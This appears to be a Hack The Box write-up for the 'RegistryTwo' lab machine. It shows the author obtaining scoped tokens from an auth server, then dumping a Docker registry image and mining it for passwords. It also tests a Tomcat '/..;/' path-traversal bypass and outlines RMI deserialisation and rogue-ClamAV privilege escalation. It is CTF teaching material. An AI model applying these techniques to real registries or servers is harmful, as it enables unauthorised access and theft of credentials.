![](https://cdn.discordapp.com/attachments/1071118357933338645/1180193865928544316/image.png?ex=657c8830&is=656a1330&hm=a50e7cf1117d5433a6dfd31c8782afdb445341a2ee667d316df74597cbbd9760&)

##  Machine Summary

**RegistryTwo** proved to be an incredibly challenging box, consuming the efforts of our team for 2-3 days just to gain initial access. The first step is to extract a Docker image from the local registry server, using the `ACME auth server` for API authentication. This is followed by locating the Tomcat on the server and using `/..;/` to grant access to a sensitive endpoint, allowing a role change to manager status. With this manager role, the web application can be reconfigured, allowing the RMI server host to be bypassed. 
A key step is to bypass validation monitoring if the RMI server host ends in `.htb', which is easily achieved with `%00' (NULL byte). Now it is possible to redirect RMI server calls to your machine. Once the traffic is redirected, running the `RMPListener` module from `ysoserial` exploits the deserialisation vulnerability, resulting in a shell inside the Docker container as an application. 
Accessing the RMI server follows, using a custom RMI client to call server functions such as `getFile'. Digging into the `.git-credentials' reveals the SSH session and user flag. The privilege escalation path introduces an interesting twist: unbind the RMI server on the server and bind your server to port `9002` as the Rouge RMI server. This gives you control over the ClamAV scan path, which originally scans user uploads. By directing it to `/root` and initiating a ClamAV server as a rogue scan server, files in `/root` can be quarantined. For the wild privilege escalation, we unbound the RMI server and set up a rogue RMI server on port `9002`. This allowed us to control the ClamAV scan path, which originally scanned user uploads. By pointing it to `/root` and starting a rogue ClamAV server, we were able to quarantine files in `/root` and flag them as malicious using custom signatures.

## Recon

```ad-summary
title: NMAP
collapse: open

```BEGIN
PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fa:b0:03:98:7e:60:c2:f3:11:82:27:a1:35:77:9f:d3 (RSA)
|   256 f2:59:06:dc:33:b0:9f:a3:5e:b7:63:ff:61:35:9d:c5 (ECDSA)
|_  256 e3:ac:ab:ea:2b:d6:8e:f4:1f:b0:7b:05:0a:69:a5:37 (ED25519)
443/tcp  open  ssl/http           nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to https://www.webhosting.htb/
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: organizationName=free-hosting/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2023-02-01T20:19:22
|_Not valid after:  2024-02-01T20:19:22
5000/tcp open  ssl/http           Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
| ssl-cert: Subject: commonName=*.webhosting.htb/organizationName=Acme, Inc./stateOrProvinceName=GD/countryName=CN
| Subject Alternative Name: DNS:webhosting.htb, DNS:webhosting.htb
| Not valid before: 2023-03-26T21:32:06
|_Not valid after:  2024-03-25T21:32:06
5001/tcp open  ssl/commplex-link?
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Fri, 01 Dec 2023 17:02:45 GMT
|     Content-Length: 10
|     found
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Date: Fri, 01 Dec 2023 17:02:18 GMT
|     Content-Length: 26
|_    <h1>Acme auth server</h1>
| ssl-cert: Subject: commonName=*.webhosting.htb/organizationName=Acme, Inc./stateOrProvinceName=GD/countryName=CN
| Subject Alternative Name: DNS:webhosting.htb, DNS:webhosting.htb
| Not valid before: 2023-03-26T21:32:06
|_Not valid after:  2024-03-25T21:32:06
```

```ad-important
title: Domains
collapse: open

- **webhosting.htb**
```

```ad-error
title: Found Credentials
collapse: open

- irogir/developer:qybWiMTRg0sIHz4beSTUzrVIl7t3YsCj9
- admin/root:52nWqz3tejiImlbsihtV
```

Port `22,443,5000,5001` are open. Lets check the website that is hosted on port 443.

![](https://cdn.discordapp.com/attachments/1071118357933338645/1180196334062534656/image.png?ex=657c8a7d&is=656a157d&hm=7d23edc7538ddbbc0387e37f41d84f704a892e6cafffa3ab509949c71dfd7919&)

So the site tells us that we can create hosts and host our website on their platform. And we have the registration option on this site, so let us create an account and check out the web application functionalities.

![](https://cdn.discordapp.com/attachments/1071118357933338645/1180199006371061840/image.png?ex=657c8cfa&is=656a17fa&hm=f92ad7f0106e645276e8a46b56dba795fdad8f95c7d9c5a6a6adc4a06be82bde&)

I created an account, logged in, and created a new domain in the `Domain`section of the website.

I configured out that this web app is written in Java.

Clicking on open redirected me to `https://www.static-eae2644f16ca.webhosting.htb/`, the `eae2644f16ca` was the random domain name the web application generated for me. This was very interesting, so I added this hostname to the `/etc/hosts` file to see if I could really get the contents of index.html.

![](https://cdn.discordapp.com/attachments/1071118357933338645/1180199897971036250/image.png?ex=657c8dce&is=656a18ce&hm=819c51e1e32ebd561072ca1256f7d5efbfa3b114e40e7848b21b397950645fcd&)

Cool, we can actually access a custom website as a subdomain that we are now pentesting.

I was pretty stuck at this point, so I just started checking other ports because we still have port 5000 and 5001.

5000 seems to be the Docker registration service.
5001 is the ACME auth server, I don't really know what that is.

```ad-info
title: ACME

The ACME server runs at a certification authority and responds to client requests, performing the requested actions if the client is authorized. An ACME client authenticates to the server by means of an “account key pair”. The client uses the private key of this key pair to sign all messages sent to the server.
```

So this is the certification authority that will be used for websites that we create on the web application (generated subdomains).

I guess the port 5001 is not so important, but actually the port 5000 dose not sound that bad, when this port is actually the `docker registry` server it might be quit interesting.

Lets take a look at it

```bash
┌──(ar0x㉿kali)-[~/Desktop/HTB/Machines/RegistryTwo]
└─$ curl 'https://www.webhosting.htb:5000/v2' -k -I
HTTP/2 301 
content-type: text/html; charset=utf-8
docker-distribution-api-version: registry/2.0
location: /v2/
date: Fri, 01 Dec 2023 18:15:32 GMT
```

This is proof that we are dealing with a legitimate custom `docker registry` server.

```ad-info
title: Docker Registry

Docker registry is like a central storage location for Docker images. It allows developers to share, distribute, and manage containerized applications easily. Public registries like Docker Hub are available for anyone to use, while private registries provide a secure way for organizations to manage their images within their own infrastructure.
```


```bash
┌──(ar0x㉿kali)-[~/Desktop/HTB/Machines/RegistryTwo]
└─$ curl 'https://www.webhosting.htb:5000/v2/_catalog' -k    
{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":[{"Type":"registry","Class":"","Name":"catalog","Action":"*"}]}]}
```

After some research, I found a `v2` API endpoint `_catalog` that gave me the above result. Now we have the `UNAUTHORIZED` error.

If we can find a way to authenticate ourselves against this docker hub API, we can actually dump the docker container images/data.

```bash
┌──(ar0x㉿kali)-[~/Desktop/HTB/Machines/RegistryTwo]
└─$ curl 'https://www.webhosting.htb:5000/v2/_catalog' -k -I                                            
HTTP/2 401 
content-type: application/json; charset=utf-8
docker-distribution-api-version: registry/2.0
www-authenticate: Bearer realm="https://webhosting.htb:5001/auth",service="Docker registry",scope="registry:catalog:*"
x-content-type-options: nosniff
content-length: 145
date: Fri, 01 Dec 2023 18:38:41 GMT
```

#### Dumping Docker Registry

#####  Obtain a Token to enumerate repositories

Looking at the response header we see the www-authenticate server and the value of this header is quite interesting. `Bearer realm="https://webhosting.htb:5001/auth",service="Docker registry",scope="registry:catalog:*"` the 5001 was the `ACME auth server`, so now we can actually request a JWT token from this server and use that to authenticate ourselves against the Docker HUB API.

```bash
┌──(ar0x㉿kali)-[~/Desktop/HTB/Machines/RegistryTwo]
└─$ curl -s 'https://webhosting.htb:5001/auth' -k | jq 
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiIiwiZXhwIjoxNzAxNDU3NTQyLCJuYmYiOjE3MDE0NTY2MzIsImlhdCI6MTcwMTQ1NjY0MiwianRpIjoiNDg5MTU0NDk3ODI1ODU2OTY3NSIsImFjY2VzcyI6W119.A5m5kywuVi6D24ZediRUtUaWZYPgiUnOyvre4nQX4nNDSg-cvLlzoWfZfNbRWDmYZorgHmW3_mWRuBsCRT_EBv9amj6__voi_TXBMPXtrH3aH8OC0boGR0OJUsOzKOOqMt_2grLiXQh6U1qRNd8s9KUaC5oiuEH7jTiAfKXwMt_RcNtwJgTpir7GZc-0bDxJMYadsT9R7XP4aYnh29ZC3vlweGsAMK8LuKl48N38udQWCkxMYveFP7HEVPETYm7Co9tOtW-RpR2DuZq_362NuMa7l3J2HzDeN4cbqXsu8vb_fSahi0iBwiuVLYTTu1R1aWJn86NQ19AYZwf168H84Q",
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiIiwiZXhwIjoxNzAxNDU3NTQyLCJuYmYiOjE3MDE0NTY2MzIsImlhdCI6MTcwMTQ1NjY0MiwianRpIjoiNDg5MTU0NDk3ODI1ODU2OTY3NSIsImFjY2VzcyI6W119.A5m5kywuVi6D24ZediRUtUaWZYPgiUnOyvre4nQX4nNDSg-cvLlzoWfZfNbRWDmYZorgHmW3_mWRuBsCRT_EBv9amj6__voi_TXBMPXtrH3aH8OC0boGR0OJUsOzKOOqMt_2grLiXQh6U1qRNd8s9KUaC5oiuEH7jTiAfKXwMt_RcNtwJgTpir7GZc-0bDxJMYadsT9R7XP4aYnh29ZC3vlweGsAMK8LuKl48N38udQWCkxMYveFP7HEVPETYm7Co9tOtW-RpR2DuZq_362NuMa7l3J2HzDeN4cbqXsu8vb_fSahi0iBwiuVLYTTu1R1aWJn86NQ19AYZwf168H84Q"
}
```

So I just sent a GET request to this endpoint, and I got an access token and a token. So now we can test to see if actuality are able to authenticate us with this token against the Docker Hub API.

But im sure this won't work because we didn't specify our scope, so this should actually work, but lets see.

```bash
┌──(ar0x㉿kali)-[~/Desktop/HTB/Machines/RegistryTwo]
└─$ curl https://www.webhosting.htb:5000/v2/_catalog -k -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiIiwiZXhwIjoxNzAxNDU3NTQyLCJuYmYiOjE3MDE0NTY2MzIsImlhdCI6MTcwMTQ1NjY0MiwianRpIjoiNDg5MTU0NDk3ODI1ODU2OTY3NSIsImFjY2VzcyI6W119.A5m5kywuVi6D24ZediRUtUaWZYPgiUnOyvre4nQX4nNDSg-cvLlzoWfZfNbRWDmYZorgHmW3_mWRuBsCRT_EBv9amj6__voi_TXBMPXtrH3aH8OC0boGR0OJUsOzKOOqMt_2grLiXQh6U1qRNd8s9KUaC5oiuEH7jTiAfKXwMt_RcNtwJgTpir7GZc-0bDxJMYadsT9R7XP4aYnh29ZC3vlweGsAMK8LuKl48N38udQWCkxMYveFP7HEVPETYm7Co9tOtW-RpR2DuZq_362NuMa7l3J2HzDeN4cbqXsu8vb_fSahi0iBwiuVLYTTu1R1aWJn86NQ19AYZwf168H84Q" -k
{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":[{"Type":"registry","Class":"","Name":"catalog","Action":"*"}]}]}
```

Yes, as expected, we couldn't authenticate, and I said the reason why the authentication request failed.

But now we fix that, now we request a new token for the specified scope `service=Docker%20registry&scope=registry:catalog:*`, and now we try again.

```bash
┌──(ar0x㉿kali)-[~/Desktop/HTB/Machines/RegistryTwo]
└─$ curl -s 'https://webhosting.htb:5001/auth?service=Docker%20registry&scope=registry:catalog:*' -k | jq 
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNzAxNDU3NjY4LCJuYmYiOjE3MDE0NTY3NTgsImlhdCI6MTcwMTQ1Njc2OCwianRpIjoiNjI4ODEwMjAzNDYyNjE0MzE5MiIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dfQ.iE6oslCXNYTqbjaiYWYtBI4mItDMqTd7dtWN32-rhb7_syVLReuSIUek3fzqXG7s8j6qArOMLnCBvDsz7rqGwETzv1kHCq1th_sXXBtqFneinwawTdnNNdIIzBBuYz_35YYno-3NhtAmfoiZ5cGKp-0SV4VbUxYeJJaRY1eJyF80W8Iew4oYhGSwKC5QmcJYmpNeOg2fnlSU_OITjK0jFdsUFBto8gObWn2TnMMVWigMtdYXFACiLPdLWtCeJ9La1on9Ruyhntmk0k2HOnmxmi59BbpJyNflRwFWpTSOLWQa3pC0w9hT_mlVY6UgzqgObt5r-JwpXhm_B5Gbx6QKhg",
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNzAxNDU3NjY4LCJuYmYiOjE3MDE0NTY3NTgsImlhdCI6MTcwMTQ1Njc2OCwianRpIjoiNjI4ODEwMjAzNDYyNjE0MzE5MiIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dfQ.iE6oslCXNYTqbjaiYWYtBI4mItDMqTd7dtWN32-rhb7_syVLReuSIUek3fzqXG7s8j6qArOMLnCBvDsz7rqGwETzv1kHCq1th_sXXBtqFneinwawTdnNNdIIzBBuYz_35YYno-3NhtAmfoiZ5cGKp-0SV4VbUxYeJJaRY1eJyF80W8Iew4oYhGSwKC5QmcJYmpNeOg2fnlSU_OITjK0jFdsUFBto8gObWn2TnMMVWigMtdYXFACiLPdLWtCeJ9La1on9Ruyhntmk0k2HOnmxmi59BbpJyNflRwFWpTSOLWQa3pC0w9hT_mlVY6UgzqgObt5r-JwpXhm_B5Gbx6QKhg"
}
```

```bash
┌──(ar0x㉿kali)-[~/Desktop/HTB/Machines/RegistryTwo]
└─$ curl https://www.webhosting.htb:5000/v2/_catalog -k -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNzAxNDU3NjY4LCJuYmYiOjE3MDE0NTY3NTgsImlhdCI6MTcwMTQ1Njc2OCwianRpIjoiNjI4ODEwMjAzNDYyNjE0MzE5MiIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dfQ.iE6oslCXNYTqbjaiYWYtBI4mItDMqTd7dtWN32-rhb7_syVLReuSIUek3fzqXG7s8j6qArOMLnCBvDsz7rqGwETzv1kHCq1th_sXXBtqFneinwawTdnNNdIIzBBuYz_35YYno-3NhtAmfoiZ5cGKp-0SV4VbUxYeJJaRY1eJyF80W8Iew4oYhGSwKC5QmcJYmpNeOg2fnlSU_OITjK0jFdsUFBto8gObWn2TnMMVWigMtdYXFACiLPdLWtCeJ9La1on9Ruyhntmk0k2HOnmxmi59BbpJyNflRwFWpTSOLWQa3pC0w9hT_mlVY6UgzqgObt5r-JwpXhm_B5Gbx6QKhg" -k

{"repositories":["hosting-app"]}
```

Kaboom, we have the repo name, now we can dump this image from the docker registry.

There are a lot of tools out there that you can use, and you can find some examples on [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry).

So I will use [DockerRegistryGrabber](https://github.com/Syzik/DockerRegistryGrabber) for now.

```bash
┌──(ar0x㉿kali)-[~/…/HTB/Machines/RegistryTwo/DockerRegistryGrabber]
└─$ python3 drg.py -A 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNzAxNDU4NzU1LCJuYmYiOjE3MDE0NTc4NDUsImlhdCI6MTcwMTQ1Nzg1NSwianRpIjoiODg2MTczMjM0MTkzNTE0Nzc4OSIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dfQ.Vk1nXPHHAXmkNGzCpbIG-a5ui-jx52O-oTF6TRgP4hGp14oWBfvN0Dwagxn2IXLiXk9jhoZGclbbutNyvJQn0pV9hWCLrT3PCD6iyHiboyMwohUC_orImG1HghUhqxU-clpfthT-DitUMvNcL0g7aye1YnshR1e9a-DEZIEkOrlLsQFyzik3s4c3IPiHyZIcO49TPlJ_B27Wyuq85znCx-q8MoSEAlbxcv_GWD1R9iY756SICD7w0S9rdw6880L1UtzcPvKlQSIPqgasqptXss4NReDqJc9Ey4ZfufIqaMQV7LyaczPYCxCMuSMbzon0ID6Se2lF_eUS62uPQtE6oQ' --list https://www.webhosting.htb
[+] hosting-app
```

It worked perfectly, the tool managed to list the repos that are on this docker registry.

##### Obtain a Token to pull hosting-app

Now we try to dump this image.

```bash
┌──(ar0x㉿kali)-[~/…/HTB/Machines/RegistryTwo/DockerRegistryGrabber]
└─$ python3 drg.py -A 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNzAxNDU4NzU1LCJuYmYiOjE3MDE0NTc4NDUsImlhdCI6MTcwMTQ1Nzg1NSwianRpIjoiODg2MTczMjM0MTkzNTE0Nzc4OSIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dfQ.Vk1nXPHHAXmkNGzCpbIG-a5ui-jx52O-oTF6TRgP4hGp14oWBfvN0Dwagxn2IXLiXk9jhoZGclbbutNyvJQn0pV9hWCLrT3PCD6iyHiboyMwohUC_orImG1HghUhqxU-clpfthT-DitUMvNcL0g7aye1YnshR1e9a-DEZIEkOrlLsQFyzik3s4c3IPiHyZIcO49TPlJ_B27Wyuq85znCx-q8MoSEAlbxcv_GWD1R9iY756SICD7w0S9rdw6880L1UtzcPvKlQSIPqgasqptXss4NReDqJc9Ey4ZfufIqaMQV7LyaczPYCxCMuSMbzon0ID6Se2lF_eUS62uPQtE6oQ' --dump hosting-app https://www.webhosting.htb
Http Error: 401 Client Error: Unauthorized for url: https://www.webhosting.htb:5000/v2/hosting-app/tags/list
```

UPS, this time we got an error and the reason is exactly the same as the first failed request. The reason is clear, we should be requesting a new token for the new scope `hosting-app/tags/list` that we need to access 

```bash
┌──(ar0x㉿kali)-[~/…/HTB/Machines/RegistryTwo/DockerRegistryGrabber]
└─$ curl -s 'https://webhosting.htb:5001/auth?service=Docker%20registry&scope=repository:hosting-app:pull' -k | jq  
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNzAxNDU5MjQ3LCJuYmYiOjE3MDE0NTgzMzcsImlhdCI6MTcwMTQ1ODM0NywianRpIjoiODY1ODIxNTY5Nzk5NjU3OTUwOCIsImFjY2VzcyI6W3sidHlwZSI6InJlcG9zaXRvcnkiLCJuYW1lIjoiaG9zdGluZy1hcHAiLCJhY3Rpb25zIjpbInB1bGwiXX1dfQ.WFiwFzi_gjCq_nwQB7EJeYE30baPFmWRf-mGGxCM6Dai3ST4iV6tPOmGPB0HCf_N8mmvwy4dr4OjkUttQUFwSY83N75FQg40jrrhh_fFUpiLDIEewkOwxDRMeGA4M3hnVeHskAlfNLtquDq8mWPhpv_FtR9AoeStvjLhoc6Ft-6FUJzZKbTFbBgLKmff-Xb2fjWcpsNBMl_qOIwasIfp8JbBZWpk2FYYa2m1y9vq7ez6MQkWS4KL9lirhXRO1JTZBTVsF3NBcQCk9jhhdL2dJuD5vY1ggEcmD_0cIO9Q8uXIFJrG_WtSj6vy10GOnABPRGCFV0MNLfL8gyNzQD4eAA",
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNzAxNDU5MjQ3LCJuYmYiOjE3MDE0NTgzMzcsImlhdCI6MTcwMTQ1ODM0NywianRpIjoiODY1ODIxNTY5Nzk5NjU3OTUwOCIsImFjY2VzcyI6W3sidHlwZSI6InJlcG9zaXRvcnkiLCJuYW1lIjoiaG9zdGluZy1hcHAiLCJhY3Rpb25zIjpbInB1bGwiXX1dfQ.WFiwFzi_gjCq_nwQB7EJeYE30baPFmWRf-mGGxCM6Dai3ST4iV6tPOmGPB0HCf_N8mmvwy4dr4OjkUttQUFwSY83N75FQg40jrrhh_fFUpiLDIEewkOwxDRMeGA4M3hnVeHskAlfNLtquDq8mWPhpv_FtR9AoeStvjLhoc6Ft-6FUJzZKbTFbBgLKmff-Xb2fjWcpsNBMl_qOIwasIfp8JbBZWpk2FYYa2m1y9vq7ez6MQkWS4KL9lirhXRO1JTZBTVsF3NBcQCk9jhhdL2dJuD5vY1ggEcmD_0cIO9Q8uXIFJrG_WtSj6vy10GOnABPRGCFV0MNLfL8gyNzQD4eAA"
}
```

So I found the scope we need to download the image on [StackOverflow](https://stackoverflow.com/questions/71409458/how-to-download-docker-image-using-http-api-using-docker-hub-credentials) under the section `Get a token (specific to Docker Hub, each registry may have different auth methods and servers):`.

So now we can actually dump the blob with this token. Lets do it.

```bash
┌──(ar0x㉿kali)-[~/…/HTB/Machines/RegistryTwo/DockerRegistryGrabber]
└─$ python3 drg.py -A 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNzAxNDU5MjQ3LCJuYmYiOjE3MDE0NTgzMzcsImlhdCI6MTcwMTQ1ODM0NywianRpIjoiODY1ODIxNTY5Nzk5NjU3OTUwOCIsImFjY2VzcyI6W3sidHlwZSI6InJlcG9zaXRvcnkiLCJuYW1lIjoiaG9zdGluZy1hcHAiLCJhY3Rpb25zIjpbInB1bGwiXX1dfQ.WFiwFzi_gjCq_nwQB7EJeYE30baPFmWRf-mGGxCM6Dai3ST4iV6tPOmGPB0HCf_N8mmvwy4dr4OjkUttQUFwSY83N75FQg40jrrhh_fFUpiLDIEewkOwxDRMeGA4M3hnVeHskAlfNLtquDq8mWPhpv_FtR9AoeStvjLhoc6Ft-6FUJzZKbTFbBgLKmff-Xb2fjWcpsNBMl_qOIwasIfp8JbBZWpk2FYYa2m1y9vq7ez6MQkWS4KL9lirhXRO1JTZBTVsF3NBcQCk9jhhdL2dJuD5vY1ggEcmD_0cIO9Q8uXIFJrG_WtSj6vy10GOnABPRGCFV0MNLfL8gyNzQD4eAA' --dump hosting-app https://www.webhosting.htb
[+] BlobSum found 36
[+] Dumping hosting-app
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b
    ....
    [+] Downloading : ff3a5c916c92643ff77519ffa742d3ec61b7f591b6b7504599d95a4a4113
```


#### Enumerating dumped filesystem

Great, now we have a look at the image and see what we can extract from it.

```bash
┌──(ar0x㉿kali)-[~/…/HTB/Machines/RegistryTwo/hosting-app]
└─$ ls
bin  blobs  dev  etc  home  lib  media  mnt  proc  root  run  sbin  srv  sys  tmp  usr  var
```

We have the docker image file system, let us grep for `password`, maybe we will find something.

I found some interesting stuff and a MySQL password in `/etc/hosting.ini'.

```log
etc/hosting.ini:mysql.password=O8lBvQUBPU4CMbvJmYqY
```

Content of `hosting.ini`

```bash
#Mon Jan 30 21:05:01 GMT 2023
mysql.password=O8lBvQUBPU4CMbvJmYqY
rmi.host=registry.webhosting.htb
mysql.user=root
mysql.port=3306
mysql.host=localhost
domains.start-template=<body>\r\n<h1>It works\!</h1>\r\n</body>
domains.max=5
rmi.port=9002
```

Additionally i saw some logs that contain `Tomcat`, lets see what tomcat is doing in this web application.

Yea i found it, we have tomcat instance and folder in placed in `usr/local/tomcat`.

```bash
┌──(ar0x㉿kali)-[~/…/RegistryTwo/hosting-app/usr/local]
└─$ ls
bin  lib  share  tomcat
```

So after a bit of searching in the tomcat files I found the main web application that we used earlier to serve our custom website. In `tomcat/webapps` you will find a `hosting.war` file and if you unzip this file you will get many classes and I just decompiled the `WEB-INF/classes/com/htb/hosting/model/User.class` to make sure that we are really dealing with the main application.

```java
// Source code is decompiled from a .class file using FernFlower decompiler.
package com.htb.hosting.model;

import java.io.Serializable;
import java.util.List;
import java.util.UUID;
import javax.persistence.Column;
import javax.persistence.Entity;
import javax.persistence.FetchType;
import javax.persistence.GeneratedValue;
import javax.persistence.Id;
import javax.persistence.OneToMany;
import javax.persistence.Table;
import org.hibernate.annotations.GenericGenerator;

@Entity
@Table(
   name = "users"
)
public class User implements Serializable {
   private static final long serialVersionUID = -7780857363453462165L;
   @Id
   @GeneratedValue(
      generator = "UUID"
   )
   @GenericGenerator(
      name = "UUID",
      strategy = "org.hibernate.id.UUIDGenerator"
   )
   @Column(
      name = "id"
   )
   protected UUID id;
   @Column(
      name = "nickname"
   )
   protected String nickname;
   @Column(
      name = "email"
   )
   protected String email;
   @Column(
      name = "password_hash"
   )
   protected String password;
   @Column(
      name = "role"
   )
   protected String role;
   @OneToMany(
      mappedBy = "user",
      fetch = FetchType.EAGER
   )
   protected List<Domain> domains;

   public String toString() {
      return this.nickname;
   }
   ..........
   public int hashCode() {
      int PRIME = true;
      int result = 1;
      Object $id = this.getId();
      result = result * 59 + ($id == null ? 43 : $id.hashCode());
      Object $nickname = this.getNickname();
      result = result * 59 + ($nickname == null ? 43 : $nickname.hashCode());
      Object $email = this.getEmail();
      result = result * 59 + ($email == null ? 43 : $email.hashCode());
      Object $password = this.getPassword();
      result = result * 59 + ($password == null ? 43 : $password.hashCode());
      Object $role = this.getRole();
      result = result * 59 + ($role == null ? 43 : $role.hashCode());
      Object $domains = this.getDomains();
      result = result * 59 + ($domains == null ? 43 : $domains.hashCode());
      return result;
   }
}
```

#### Tomcat Path Traversal

So if the web application is hosted on Tomcat server, we can try to access the protected directories in Tomcat using the path `/..;/`.

HackTricks also notes that on this page https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat

So lets test it!

![](https://cdn.discordapp.com/attachments/1071118357933338645/1180237128865677413/image.png?ex=657cb07b&is=656a3b7b&hm=4fdd3be6159e4f902e0b1ccfd7ab77b98f1bf6479041fed33b199935b62514fc&)

This is actually good because we didn't get an error, now we should find the endpoint we want and hopefully by requesting it we will see a page.

![](https://cdn.discordapp.com/attachments/1071118357933338645/1180237952455036969/image.png?ex=657cb13f&is=656a3c3f&hm=366cb1c9a8616c67bfb280c2ee66b6e27352d55650c70b54ab19a00735253616&)

